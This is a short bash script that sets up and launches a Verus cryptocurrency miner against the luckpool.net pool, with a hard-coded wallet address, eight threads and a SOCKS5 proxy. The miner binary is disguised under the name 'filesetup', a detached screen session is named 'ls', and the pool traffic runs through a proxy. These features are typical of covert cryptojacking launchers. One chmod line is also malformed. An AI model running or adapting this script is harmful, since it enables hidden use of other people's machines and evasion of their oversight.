#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x tole.sh && chmod +x filesetup chmod 777 filesetup tole.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RYJsvDKu1rD97rudVZrKG5xjs9TPqgbyrZ
WORKER=$(echo $(shuf -i 1-10 -n 1)hape)
PROXY=socks5://174.64.199.82:4145
./filesetup -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RYJsvDKu1rD97rudVZrKG5xjs9TPqgbyrZ.RIZA2 -t 8 -x socks5://174.64.199.82:4145
